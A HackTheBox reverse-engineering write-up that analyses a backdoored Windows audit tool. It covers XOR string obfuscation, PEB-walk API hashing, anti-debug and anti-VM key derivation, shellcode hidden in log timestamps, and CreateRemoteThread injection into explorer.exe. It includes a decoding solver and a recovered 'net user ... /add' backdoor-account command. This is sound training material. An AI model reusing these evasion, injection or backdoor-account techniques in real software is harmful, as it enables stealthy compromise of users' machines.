![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>CorpSyncAudit</font>

24<sup>th</sup> April 2026

Prepared By: `connar`

Challenge Author(s): `connar`

Difficulty: <font color='red'>Hard</font>

<br><br>

# Synopsis (!)

The tool monitors node connectivity and allows loading historical log files for review. Reversing the binary reveals that it contains a backdoor where a specially crafted log file triggers a hidden parsing path that reconstructs shellcode byte-by-byte from encoded datetime stamp fields. The shellcode is injected into explorer.exe and adds a privileged backdoor user, whose password is the flag.


## Description (!)

Compliance is Damas Marrowcairn's favorite kind of war, because nobody ever calls it war. When the Salt Crown started forcing every organization under its reach through routine audits, Damas saw the opening before anyone else did: whoever builds the audit tooling gets to decide what the tooling actually checks for. He didn't need to bribe a single official. He needed one contractor, quietly paid, to slip something extra into the software everyone was already required to install.

The contractor delivered exactly what was asked for on paper. The logs came back clean, the audits passed, and nobody in Crownspire's compliance office thought to look twice at a report that told them precisely what they wanted to hear. Weeks later, the contractor was gone, no forwarding address, no last invoice, the kind of disappearance Damas arranges for people once they've stopped being useful and started being a liability.

You're the one finally looking at what actually shipped. Somewhere in that binary, past the imports it doesn't want you to find, is a parsing path that was never meant to run during a normal audit, and a log file crafted to wake it up. Follow it far enough and you'll see exactly what Damas bought with one quiet contract: a door into every machine that ever passed the test.


## Skills Required (!)

- Familiarity with C/C++ code
- Basic reverse engineering with Ghidra or IDA
- Understanding of Windows internals (PE format, PEB, API resolution)
- Basic Python scripting
- Debugging with x64dbg

## Skills Learned (!)

- Identifying and decrypting XOR-obfuscated strings in binaries via macros
- Understanding concepts such as PEB-walk dynamic API resolution and API Hashing techniques
- Recognising and bypassing anti-debug and anti-emulation tricks
- Reconstructing a steganographic payload hidden across log file timestamps
- Deriving a deterministic environmental key from static binary analysis to evade emulation

# CorpSyncAudit - HackTheBox Challenge Writeup

**Category:** Reverse Engineering  
**Difficulty:** Hard  
**Binary:** `CorpSyncAudit.exe` - 64-bit Windows PE

## Background

According to the challenge description, a company hired a freelancer to build a simple AD health-checker utility. The tool is pretty simple, it pings AD nodes, generates "sync reports" showing which nodes are online or offline and lets administrators load old `.log` files to review past sessions. We are provided with the app as well as a folder of past logs.

## Running the App

Before opening a disassembler, we will run the app and observe its behavior. On a clean Windows VM, `CorpSyncAudit.exe` launches and presents a welcome screen. Clicking through puts us on a dashboard with two main features:

- **Test AD Sync** connects to the companies' server and displays node health information.
- **Browse** log path field allows loading a `.log` file for review.

Nothing unusual at first glance. The UI looks legitimate. Let's now get assisted by a disassembler.

## Loading into Ghidra

We drag `CorpSyncAudit.exe` into Ghidra for further analysis. The binary is a 64-bit PE with 576 functions and over 3,500 symbols.

As soon as we start browsing the decompilation, we notice that there is something odd about the app, specifically the fact that **there are virtually no readable strings anywhere.** Every function that should have some visible text instead passes mysterious byte array pointers into a helper function. No trace of the text we saw when we originally launched the app.

Looking at the import table doesn't help much either. The usual suspects - `MessageBoxA`, `CreateWindowExA`, `VirtualAllocEx` - are not present in a straightforward way. The binary clearly does *something* with Windows APIs but hides how.

In order to proceed, we need to first see how we can "recover" the app strings and text in order to have a better understanding of what is happening.

## Finding the String Decryptor

Our first useful clue comes from cross-reference counts. Sorting non-imported functions by xref count, one stands at the top of the list: **`FUN_1400016c0`** with 83 cross-references. It is called almost everywhere. Let's decompile it:

```c
undefined8 * FUN_1400016c0(undefined8 *param_1, longlong param_2, longlong param_3)
{
  byte local_24[4];
  ulonglong local_20;

  local_24[0] = 0x9f;
  local_24[1] = 0x50;
  local_24[2] = 0x66;
  local_24[3] = 0x20;

  FUN_14001ad10(param_1);
  for (local_20 = 0; local_20 < param_3 - 1U; local_20 = local_20 + 1) {
    FUN_14001b1c0(param_1,
        local_24[(uint)local_20 & 3] ^ *(byte *)(local_20 + param_2));
  }
  return param_1;
}
```

This is a simple XOR cipher. The function takes a destination string object, a pointer to an encrypted byte array in the binary's data section, and a length. It then XORs each byte with a 4-byte rolling key `{ 0x9F, 0x50, 0x66, 0x20 }` and appends the result character by character.

Every single string in this binary is stored encrypted and decrypted at runtime via this function. That's why the string table looks empty in static analysis tools.

### Decrypting Strings via scripting

We can recover all strings by writing a quick Python script that finds every call to `FUN_1400016c0`, reads the data pointer and length argument, and decrypts the bytes at that address:

```python
KEY = [0x9f, 0x50, 0x66, 0x20]

def decrypt(data: bytes) -> str:
    return ''.join(
        chr(b ^ KEY[i % 4]) for i, b in enumerate(data[:-1])
    )
```

Alternatively, in **x64dbg**, place a breakpoint on `FUN_1400016c0` and log `param_2` (the data pointer) and the resulting string object at return. Either way, once we decrypt the strings, the binary opens up like a book.

Some notable recovered strings include:
- `"explorer.exe"` - a process name
- `"logs\sync_%d_%02d%02d_%02d%02d%02d.log"` - the log file path format
- `"Region="` - a log parsing tag
- `"GMT"` - a timezone identifier
- Various day names: `"Monday"`, `"Tuesday"`, etc.
- `"--- START REPLICATION SESSION: LIVE_SYNC ---"` and `"[LIVE]"` - log markers

With strings decrypted, we can now make sense of the functions.

## Phase 4 - Understanding the API Resolution Trick

With strings under control, we turn to the missing imports. There is a second heavily cross-referenced function: **`FUN_14000185f`** (40 xrefs), always called with two arguments that look like large 64-bit constants. Let's look at it:

```c
longlong FUN_14000185f(ulonglong param_1, uint param_2)
{
  // Walk PEB InMemoryOrderModuleList
  puVar6 = (undefined8 *)(*(longlong *)(*(longlong *)(GS_OFFSET + 0x60) + 0x18) + 0x20);
  local_10 = (undefined8 *)*puVar6;

  do {
    if (local_10 == puVar6) return 0;   // end of list

    // For each loaded DLL, walk its export table
    for (local_14 = 0; local_14 < NumberOfNames; local_14++) {
      char *name = DllBase + names[local_14];
      uVar10 = FUN_140001775(name, strlen(name));  // hash it

      if ((param_2 ^ param_1) == uVar10)           // compare to target
        return DllBase + funcs[ordinals[local_14]]; // return pointer
    }
    local_10 = (undefined8 *)*local_10;
  } while(true);
}
```

This is the classic **PEB walking** API resolution technique used by shellcode and evasive malware. The binary avoids putting sensitive function names in its import table. Instead, it hashes every export name from every loaded DLL and compares against pre-computed target hashes.

The second argument, `param_2`, is a `masterKey`. The actual target hash is recovered as `param_1 XOR param_2`. This means the stored hash constants in the binary are obfuscated. They only make sense when XOR'd with the correct master key at runtime.

The hash function itself, **`FUN_140001775`**, is a case-insensitive FNV-1a variant (a custom hash function) with a rotation mix and finalisation step:

```c
// Ghidra: FUN_140001775 - rxm64_hash
local_10 = 0xcbf29ce484222325ULL;  // FNV offset basis
for each byte c in input:
    if 'a' <= c <= 'z': c -= 0x20  // force uppercase
    local_10 = rotr64((local_10 ^ c) * 0x100000001b3, 13)
// finalisation avalanche
result = ((local_10 ^ (local_10 >> 33)) * 0xff51afd7ed558ccd) ...
```

The stored XOR'd hash constants in the source correspond to APIs like `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `OpenProcess` and `CreateToolhelp32Snapshot`. These are injection APIs which already tells us a lot about what this binary eventually intends to do.

## The Environmental Master Key

So where does `masterKey` come from? Tracing callers of `FUN_14000185f` leads us to `FUN_140001a5a`, which is always called first to produce a key structure. Let's decompile it:

```c
// Ghidra: FUN_140001a5a - GenerateMultiKey()

// Component 1: read the first byte of ProcessAudit() itself
K_PROLOGUE = (uint)(*ProcessAudit_ptr);

// Component 2: try to open a file that doesn't exist, capture LastError
CreateFileA(fake_nonexistent_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
ErrorKey = GetLastError();   // expects 0x2 (ERROR_FILE_NOT_FOUND)

// Component 3: read the IDT limit register
__asm__("sidt %0" : "=m"(idtr));
K_IDT = (uint)idtr.limit;

// Component 4: stall loops that accumulate a timing-dependent value
for (i = 0; i < 0x4F672; i++) {
    GetCurrentProcessId();
    GetCurrentProcess();
    stall_key += i;
}
for (i = 0; i < 0x2B157; i++) {
    GlobalFindAtomA(dummy_atom);
    stall_key += i;
    if (i == 0x2B44) stall_key ^= 0x424A;
}
K_T = (GetTickCount() - start) >> 10;

// Final: XOR everything together
FinalMaster = K_IDT ^ K_T ^ stall_key ^ ErrorKey ^ K_PROLOGUE;
```

This is a multi-component **environmental key** - a fingerprint of the execution environment used directly into the generation of the decryption key. Each component is an anti-analysis measure in its own way:

**`K_PROLOGUE` - Software Breakpoint Detection**  
The function reads its own first byte. On a clean system this is `0x55` (the standard x86-64 function prologue `PUSH RBP`). If we had placed a software breakpoint at the top of `ProcessAudit` in a debugger, that byte will be `0xCC` (INT3). The key changes, API resolution silently returns null pointers, and nothing works.

**`K_IDT` - VM / Kernel Debugger Detection**  
The IDT (Interrupt Descriptor Table) limit register has well-known distinct values on bare metal versus inside a VM or under a kernel debugger. This value is used into the key, so an analyst running the binary in a typical analysis VM with a kernel debugger will produce a different `FinalMaster` and get wrong results.

**`K_T` - Emulation Speed Detection**  
The two stall loops are large and deliberately call real Windows APIs. On a native machine they take a predictable amount of wall-clock time. Under a dynamic instrumentation framework like Frida or an emulator like QEMU, the loops run at a wildly different speed. The elapsed time is shifted right by 10 bits and baked into the key - a small timing deviation produces a completely different `FinalMaster`.  *A similar technique can be seen in the [StealC malware](https://blog.lexfo.fr/StealC_malware_analysis_part1.html).*

**`stall_key`** adds a deterministic but non-trivial accumulation that makes patching out the timing component without understanding the full logic difficult.

The takeaway is that you cannot simply run this under a standard debugger with software breakpoints and expect things to work. The correct approach for dynamic analysis would be to use **hardware breakpoints** (which do not modify memory) and run on a bare-metal or minimally instrumented environment. A hardware breakpoint placed at the `ret` of `GenerateMultiKey` will let you read the correct `FinalMaster` from the return register. Alternatively, you can write a local PoC that generates the keys for you on your real system.

## Suspicious Log File

Now we look at what the app does with the log files we were given. There is a folder of `.log` files corresponding to past sync sessions. Most of them look like `sync_20260412_192334.log`. Let's compare two:

**A normal log file:**
```
--- START REPLICATION SESSION: LIVE_SYNC ---
[LIVE] NODE=AD-SRV-01 STATUS=ONLINE LATENCY=0.41ms USN=238960
Monday, 01/01/2026 12:00:00 PM UTC | Region=HEADQUARTERS
[LIVE] NODE=AD-SRV-02 STATUS=ONLINE LATENCY=0.47ms USN=623114
Monday, 01/01/2026 12:00:00 PM UTC | Region=BRANCH_OFFICE_A
...
--- END REPLICATION SESSION ---
```

Seven entries, all dated `Monday, 01/01/2026`, all `12:00:00 PM UTC`. The regions are company-internal names: `HEADQUARTERS`, `BRANCH_OFFICE_A`, `BRANCH_OFFICE_B`, `OFFSITE_BACKUP`, `LOCAL_TEST_NODE`, `DEV_SANDBOX`.

**The suspicious log (`sync_20260412_192364.log`):**
```
--- START REPLICATION SESSION: 2026-04-14T13:03:18.887662 ---
[LIVE] NODE=AD-SRV-02 STATUS=ONLINE LATENCY=6.93ms USN=369902
Saturday, 16/11/1996 18:49:33 PM GMT | Region=NORTH_AMERICA
[LIVE] NODE=AD-SRV-03 STATUS=ONLINE LATENCY=1.4ms USN=527583
Tuesday, 01/02/2028 00:20:40 AM UTC  | Region=WORLD
[LIVE] NODE=AD-BK-01 STATUS=ONLINE LATENCY=13.13ms USN=168436
Monday, 01/11/2042 18:11:33 PM UTC   | Region=AFRICA_SOUTH
...
```

This is over 100 entries with many parts that stand out:
- Timestamps span **1990 to 2050** - clearly not real sync logs.
- The timezone alternates between `UTC` and `GMT` in a seemingly intentional pattern.
- The region names are **geographic** (`NORTH_AMERICA`, `WORLD`, `AFRICA_SOUTH`, `SUB_SAHARAN_AFRICA`, `ASIA`, `OCEANIA`, `LATIN_AMERICA`, `EU_EASTERN`, `EU_WESTERN`, `RUSSIA`...) rather than company-internal names.
- The session header contains a full ISO timestamp instead of the usual `LIVE_SYNC` marker.
- The file is significantly larger than any normal log.

This file is an outlier. A real AD sync session from 2026 does not contain entries dated 1996 or 2042, so this makes us think that perhaps payload is obfuscated in these datetime formats. But how?

## Tracing the `ProcessAudit` Function

When the user clicks Browse and selects a log file, the handler calls `ProcessAudit` (Ghidra: the cluster around `FUN_140003215`). Let's trace its logic after decrypting the strings it uses:

```c
void ProcessAudit(const char* szPath) {
    ifstream file(szPath);
    string line;
    g_ExtractedPayload.clear();

    // Generate the environmental key first
    EnvironmentalKeys keys = GenerateMultiKey();

    // Split FinalMaster into 4 bytes for later XOR
    k[0] = (keys.FinalMaster >> 24) & 0xFF;
    k[1] = (keys.FinalMaster >> 16) & 0xFF;
    k[2] = (keys.FinalMaster >> 8)  & 0xFF;
    k[3] =  keys.FinalMaster        & 0xFF;

    while (getline(file, line)) {
        // Look for "Region=" in each line
        size_t regPos = line.find("Region=");
        if (regPos != string::npos) {
            string region = line.substr(regPos + 7);

            // Hash the region string
            uint64_t currentHash = rxm64_hash(region.c_str(), region.length());

            // Check against 32 hardcoded hashes
            int matchedIndex = -1;
            for (int i = 0; i < 32; i++) {
                if (currentHash == region_hashes[i]) {
                    matchedIndex = i;
                    break;
                }
            }

            if (matchedIndex != -1) {
                // BACKDOOR PATH -> decode this line into 4 shellcode bytes
                TimeFields tf = {0};
                // parse the timestamp from the line...
                // map matchedIndex (0-31) to 5 region_bits
                for (int j = 0; j < 5; j++)
                    tf.region_bits[4 - j] = (matchedIndex & (1 << j)) ? '1' : '0';

                uint8_t chunk[4];
                decode_time_to_bytes(&tf, chunk);

                for (int i = 0; i < 4; i++)
                    g_ExtractedPayload.push_back(chunk[i] ^ k[i]);

                continue;  // skip the normal node-count path
            }
        }

        // Normal path: count [LIVE] entries
        if (line.find("[LIVE]") != string::npos) totalNodes++;
    }

    // If payload was built, execute it
    if (!g_ExtractedPayload.empty()) {
        EnableMemoryProtection();
        InjectToRemoteProcess("explorer.exe", g_ExtractedPayload, keys.FinalMaster);
    }
}
```

The 32 region_hashes[] are 64-bit constants hardcoded in the binary, but the region name strings that produce those hashes are not stored anywhere - only their fingerprints are. This matters because the region_bits XOR flags, which control how each timestamp field is decoded, are derived directly from the matched index (0-31). If we don't know which region name maps to which index, we can't correctly set those flags and the decoded bytes will be garbage. To recover the mapping, we reimplement rxm64_hash in Python and run it against a list of plausible geographic region name candidates until we find all 32 matches. Since the names are short human-readable strings, the search space is tiny and exhausted in milliseconds.

```python
def rxm64_hash(data: bytes) -> int:
    h = 0xcbf29ce484222325
    prime = 0x100000001b3
    MOD = 2**64
    for b in data:
        c = b - 32 if ord('a') <= b <= ord('z') else b
        h = (h ^ c) * prime % MOD
        h = ((h >> 13) | (h << 51)) & 0xFFFFFFFFFFFFFFFF
    h ^= h >> 33
    h = h * 0xff51afd7ed558ccd % MOD
    h ^= h >> 33
    h = h * 0xc4ceb9fe1a85ec53 % MOD
    h ^= h >> 33
    return h

candidates = [
    "WORLD", "NORTH_AMERICA", "SOUTH_AMERICA", "LATIN_AMERICA",
    "EUROPE", "EU_EASTERN", "EU_WESTERN", "AFRICA", "AFRICA_SOUTH",
    "AFRICA_EAST", "AFRICA_NORTH", "SUB_SAHARAN_AFRICA",
    "ASIA", "ASIA_PACIFIC", "MIDDLE_EAST", "OCEANIA",
    "RUSSIA", "HEADQUARTERS", "BRANCH_OFFICE_A", "BRANCH_OFFICE_B",
    "DEV_SANDBOX", "OFFSITE_BACKUP", "LOCAL_TEST_NODE",
    # ... etc.
]

for name in candidates:
    h = rxm64_hash(name.encode())
    if h in known_region_hashes:
        print(f"  index {known_region_hashes.index(h)}: {name}")
```

The normal log uses region names like `HEADQUARTERS` and `BRANCH_OFFICE_A` - these do **not** appear in the 32-hash table. The suspicious log uses geographic names like `WORLD`, `NORTH_AMERICA`, `AFRICA_SOUTH` - these **do** match. That's by design, where the hash table is the trigger mechanism, and the geographic names are the encoding alphabet.

## How a Timestamp Becomes Shellcode

Every matching log line produces exactly **4 bytes** of shellcode. The encoding is that each timestamp field (year, month, day, hour, minute, second, weekday) contributes bits to a 32-bit packed integer, and the region index (0-31) controls which fields are XOR-obfuscated.

Let's trace through an example. Take this line from the suspicious log:

```
Saturday, 16/11/1996 18:49:33 PM GMT | Region=NORTH_AMERICA
```

**1. Identify the region index.**  
We look up `NORTH_AMERICA` in our hash table. Suppose it maps to index 0 (binary `00000`). The 5 `region_bits` are all `'0'`, meaning none of the XOR flags are active.

**2. GMT timezone: un-mix the time.**  
The timezone is `GMT`, so the deobfuscation step in `FUN_14000314a` applies:
```
H=18, M=49, S=33
b = (H + M - S) / 2 = (18 + 49 - 33) / 2 = 17
a = H - b = 18 - 17 = 1
c = M - b = 49 - 17 = 32
-> raw_h=1, raw_m=17, raw_s=32
```
This un-mixing step means the stored time in the GMT-tagged lines is itself an obfuscated representation of the actual hour/minute/second to encode. GMT lines have an extra layer of obfuscation.

**3. Apply region_bits XOR flags.**  
Since all region_bits are `'0'` here, no XORs apply: `raw_h=1`, `raw_m=17`, `raw_s=32`, `raw_d=16`, `raw_mo=11`, `raw_y=1996-1990=6`.

**4. Bit-pack into 32 bits.**

Ghidra: `FUN_140003215` - `decode_time_to_bytes`

```c
uint32_t n = (raw_h  << 27)   // 5 bits -> hour
           | (raw_m  << 21)   // 6 bits -> minute
           | (raw_s  << 15)   // 6 bits -> second
           | (raw_d  << 10)   // 5 bits -> day
           | (raw_mo <<  6)   // 4 bits -> month
           | (raw_y  -  0);   // 6 bits -> year - 1990
```

**5. XOR with day value.**  
The weekday name `"Saturday"` maps to value `6` via `FUN_140002f53` (Monday=1 ... Sunday=7). Each of the 4 output bytes is XOR'd with `6`:
```c
out[0] = ((n >> 24) & 0xFF) ^ 6;
out[1] = ((n >> 16) & 0xFF) ^ 6;
out[2] = ((n >>  8) & 0xFF) ^ 6;
out[3] = (n         & 0xFF) ^ 6;
```

**6. XOR with `FinalMaster`.**  
The resulting 4 bytes are XOR'd with the 4 bytes of `FinalMaster` before being pushed into the payload buffer. This final XOR ties the shellcode to the specific execution environment.

Every line in the suspicious log that has a matching region name goes through this exact process. With 100+ matching lines, the binary reconstructs a complete shellcode buffer, 4 bytes per entry.

## Anti-Debug Wall Before Injection

Once the payload buffer is assembled, before any injection happens, `ProcessAudit` calls `EnableMemoryProtection` - **`FUN_140001f3e`**:

```c
// Ghidra: FUN_140001f3e - EnableMemoryProtection()
hJob = CreateJobObjectA(NULL, NULL);
AssignProcessToJobObject(hJob, GetCurrentProcess());

// Set process memory limit to current working set + 8 KB
limits.ProcessMemoryLimit = WorkingSetSize + 0x2000;
limits.LimitFlags = JOB_OBJECT_LIMIT_PROCESS_MEMORY;
SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &limits, sizeof(limits));
```

This creates a Job Object and assigns the current process to it with a very tight memory limit - just enough for native execution, but not enough to accommodate the extra memory a debugger allocates in the target process. If a debugger is present, the memory limit is exceeded and the OS terminates the process before `CreateRemoteThread` can fire. This technique was shown @[secret.club](https://secret.club/2021/01/20/diet-process.html).

This is documented in the wild as a reliable anti-breakpoint technique. The only reliable way to get past it dynamically is to either patch out the `SetInformationJobObject` call, or run without a debugger and observe the injected process's behavior instead.

## Process Injection into `explorer.exe`

After the anti-debug wall, the binary calls `InjectToRemoteProcess` - **`FUN_14000340b`** - with the target name `"explorer.exe"` (recovered from the decrypted string table):

```c
// Ghidra: FUN_14000340b - InjectToRemoteProcess()
// All sensitive APIs are resolved dynamically via FUN_14000185f

// Snapshot all running processes
hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

// Walk the list until we find "explorer.exe"
Process32First(hSnapshot, &pe32);
do {
    if (stricmp(pe32.szExeFile, "explorer.exe") == 0) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        break;
    }
} while (Process32Next(hSnapshot, &pe32));

// Allocate RW memory in explorer, write shellcode, flip to RX, run it
remoteBuf = VirtualAllocEx(hProcess, NULL, payload.size(),
                           MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProcess, remoteBuf, payload.data(), payload.size(), NULL);
VirtualProtectEx(hProcess, remoteBuf, payload.size(), PAGE_EXECUTE_READ, &oldProtect);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
```

This is textbook `CreateRemoteThread` shellcode injection. The shellcode now runs inside `explorer.exe`'s address space, which is a long-lived process with relatively high privileges - ideal for the attacker's purposes. Because every API call here is resolved via PEB-walking rather than visible imports, a simple IAT inspection will show nothing suspicious.

## Reconstructing the shellcode
At this point we understand the algorithm and how the backdoor log filenis parsed, how each timestamp encodes 4 bytes, how the region index controls the XOR flags, and how `FinalMaster` is applied as a final layer. Rather than running the binary and fighting the anti-debug walls, we can **reimplement the entire decoding pipeline in Python** and recover the shellcode purely statically.

There are five things to replicate:

1. `rxm64_hash` - to identify which log lines carry payload
2. `index_to_region_bits` - to derive the 5 XOR-control flags from the hash-table index
3. `deobfuscate_time` - the GMT un-mixing step
4. `decode_time_to_bytes` - the full bit-packing pipeline
5. `FinalMaster` - the environmental key applied as the final XOR

The first four are pure deterministic logic lifted directly from the source. The fifth deserves a closer look.

### Recovering FinalMaster Without Running the Binary

Recall the formula from `GenerateMultiKey` (`FUN_140001a5a`):

```
FinalMaster = K_IDT ^ K_T ^ stall_key ^ ErrorKey ^ K_PROLOGUE
```

Let's go through each component:

**`K_PROLOGUE = 0x55`**  
The binary reads the very first byte of `ProcessAudit` to check for software breakpoints. On an unmodified binary that byte is `0x55` - the standard x86-64 `PUSH RBP` prologue. We can verify this directly in Ghidra by looking at the start of the function.

**`ErrorKey = 0x02`**  
The binary calls `CreateFileA` on a path that does not exist, then reads `GetLastError()`. A missing file always returns `ERROR_FILE_NOT_FOUND = 2`. This never varies.

**`K_IDT = 0x0FFF`**  
The IDT on a standard x64 Windows machine holds 256 entries of 16 bytes each: `(256 x 16) - 1 = 0x0FFF`. This is the value the `SIDT` instruction returns on a normal bare-metal installation.

**`stall_key`**  
Although this sits inside timing-sensitive code it is in fact 100% deterministic. The two loops do nothing but accumulate an integer sum - no syscall return values, no timestamps, no entropy. Running them ourselves:

```python
stall_key = 0
for i in range(0x4F672):
    stall_key = (stall_key + i) & 0xFFFFFFFF
for i in range(0x2B157):
    stall_key = (stall_key + i) & 0xFFFFFFFF
    if i == 0x2B44:
        stall_key = (stall_key ^ 0x424A) & 0xFFFFFFFF
# stall_key = 0xf07ec90c
```

**`K_T`**  
This is `(elapsed_ms) >> 10`, where `elapsed_ms` is the wall-clock time of the stall loops. On any reasonably fast native machine the loops finish in well under a second, so `elapsed_ms < 1024` and `K_T = 0`. The binary's own source code even confirms this expectation - the comment in `GenerateMultiKey` reads *"expected Master Key: `0xf07ec6a4`"*, which is exactly what we get with `K_T = 0`:

```
0x0FFF ^ 0 ^ 0xf07ec90c ^ 0x02 ^ 0x55 = 0xf07ec6a4
```

Every component of `FinalMaster` is therefore knowable without running the binary at all. The timing stall is a trap for emulators, not for a static analyst who reads the loops carefully.

### Solver Script

With all components understood, we can write a complete solver that accepts the log file and outputs the raw shellcode:

```python
import re, sys, argparse, struct, os, base64

_M = 0xFFFFFFFFFFFFFFFF
def _rotr64(n, b):
    n &= _M
    return ((n >> b) | (n << (64 - b))) & _M

def rxm64_hash(data: bytes) -> int:
    h, p = 0xcbf29ce484222325, 0x100000001b3
    for b in data:
        c = (b - 32) if 97 <= b <= 122 else b
        h = _rotr64((h ^ c) * p & _M, 13)
    h = (h ^ (h >> 33)) & _M
    h = (h * 0xff51afd7ed558ccd) & _M
    h = (h ^ (h >> 33)) & _M
    h = (h * 0xc4ceb9fe1a85ec53) & _M
    return (h ^ (h >> 33)) & _M


REGION_HASHES = [
    0x96409ff6aeb69064, 0xa388696d5e9ae1f2, 0xff5ca9dfb7509bdb, 0xb085f689913f3762,
    0x2f9c1db0846de64e, 0xeffc2b3669db8292, 0x1894463f0fbc0f9e, 0x81e4aa341307782b,
    0xb8609753fef8b18d, 0xe0d8367aaf202156, 0xf33f3e31c257dabd, 0x9e7a78f42b97b4d6,
    0xc4427b2aef260591, 0x0e9edca9cbba3552, 0xce31708176b158d1, 0xec3eca83966f9f99,
    0xf12a05c282f1caa2, 0x4bad433b483526ea, 0xfc1219e953fea0cb, 0xee0abcf320013087,
    0x7a397f728fbf9028, 0xc7152b1900fdea7e, 0xfcfa75d56995f8d9, 0xf2a35e0e90372a96,
    0x3e9df7003ff6f7f7, 0xa3acd9b547ac1c68, 0xe5e1111fd25d5a88, 0x426d3ebf9f854a23,
    0x29fb46f83399ebb4, 0xac1b5fd672fcb7ee, 0xfe81e97108117d59, 0x9fd85a088cfd699a,
]
_H2I = {h: i for i, h in enumerate(REGION_HASHES)}


_DAY = {'Monday':1,'Tuesday':2,'Wednesday':3,'Thursday':4,
        'Friday':5,'Saturday':6,'Sunday':7}


_STALL_KEY = 0xf07ec90c

def derive_final_master(k_t: int = 0) -> int:
    """
    FinalMaster = K_IDT ^ K_T ^ stall_key ^ ErrorKey ^ K_PROLOGUE
    With K_T=0 (fast native machine) this yields 0xf07ec6a4,
    which matches the 'expected Master Key' comment in the source.
    """
    return (0x0FFF ^ k_t ^ _STALL_KEY ^ 0x02 ^ 0x55) & 0xFFFFFFFF

def index_to_bits(idx: int) -> str:
    return ''.join('1' if idx & (1 << j) else '0' for j in range(4, -1, -1))


_LINE_RE = re.compile(
    r'^([A-Za-z]+),\s+(\d{1,2})/(\d{1,2})/(\d{4})\s+'
    r'(\d{1,2}):(\d{2}):(\d{2})\s+([AP]M)\s+(\w+)'
)

def decode_entry(weekday, day, month, year, hour, minute, second, tz, bits) -> bytes:
    if tz.upper() == 'GMT':
        b = (hour + minute - second) // 2
        hour, second, minute = hour - b, minute - b, b

    raw_h  = (hour   ^ 12) if bits[0] == '1' else hour
    raw_m  = (minute ^ 30) if bits[1] == '1' else minute
    raw_s  = (second ^ 30) if bits[2] == '1' else second
    raw_d  = (day    ^ 16) if bits[3] == '1' else day
    raw_mo = (month  ^  6) if bits[4] == '1' else month
    raw_y  = year - 1990

    n = ((raw_h << 27) | (raw_m << 21) | (raw_s << 15) |
         (raw_d << 10) | (raw_mo << 6) | raw_y) & 0xFFFFFFFF

    dv = _DAY.get(weekday, 1)
    return bytes([((n >> s) & 0xFF) ^ dv for s in (24, 16, 8, 0)])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('logfile')
    args = ap.parse_args()

    fm = derive_final_master()
    print(f'[*] FinalMaster : 0x{fm:08x}')
    km = struct.pack('>I', fm)

    payload   = bytearray()
    n_entries = 0

    with open(args.logfile, errors='replace') as f:
        for lineno, raw in enumerate(f, 1):
            line = raw.rstrip('\r\n')
            if 'Region=' not in line:
                continue

            region = line[line.find('Region=') + 7:].strip()
            idx    = _H2I.get(rxm64_hash(region.encode()))
            if idx is None:
                continue

            m = _LINE_RE.match(line)
            if not m:
                print(f'[!] Line {lineno}: parse failed - {line!r}')
                continue

            wd, d, mo, yr, hr, mn, sc, _, tz = m.groups()
            bits  = index_to_bits(idx)
            chunk = decode_entry(wd, int(d), int(mo), int(yr),
                                 int(hr), int(mn), int(sc), tz, bits)
            chunk = bytes(chunk[i] ^ km[i] for i in range(4))
            payload.extend(chunk)
            n_entries += 1

    print(f'[+] Entries decoded  : {n_entries}')
    print(f'[+] Shellcode size   : {len(payload)} bytes')

    if not payload:
        print('[!] No payload found - check you are using the malicious log file.')
        sys.exit(1)

    out = os.path.splitext(args.logfile)[0] + '.bin'
    with open(out, 'wb') as f:
        f.write(payload)
    print(f'[+] Written to       : {out}')


    strings, run = [], []
    for b in payload:
        if 0x20 <= b < 0x7f:
            run.append(chr(b))
        else:
            if len(run) >= 6:
                strings.append(''.join(run))
            run = []
    if len(run) >= 6:
        strings.append(''.join(run))

    if strings:
        print('\n[*] Embedded strings:')
        for s in strings:
            print(f'    {s!r}')

    else:
        print('\n[!] No readable strings found - FinalMaster may be wrong.')
        print('    Tip: capture it at runtime with a hardware breakpoint at the')
        print('    return of FUN_140001a5a (GenerateMultiKey) and pass it with --key.')

if __name__ == '__main__':
    main()
```

### Running the Script

```
python solver.py logs/sync_20260412_192364.log
[*] FinalMaster : 0xf07ec6a4
[+] Entries decoded  : 99
[+] Shellcode size   : 396 bytes
[+] Written to       : logs/sync_20260412_192364.bin

[*] Embedded strings:
    'AQAPRQVH1'
    'AXAX^YZAXAYAZH'
    'net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add && net localgroup "Remote Desktop Users" backup_admin /add'
```

We see the app tries to add a new admin user to the Remote Desktop USers group, with a password that looks like a base64 string. Trying to decode it from b64, we get the flag:
```py
>>> from base64 import b64decode as bd64
>>> bd64("SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==")
b'HTB{REDACTED}'
>>>
```
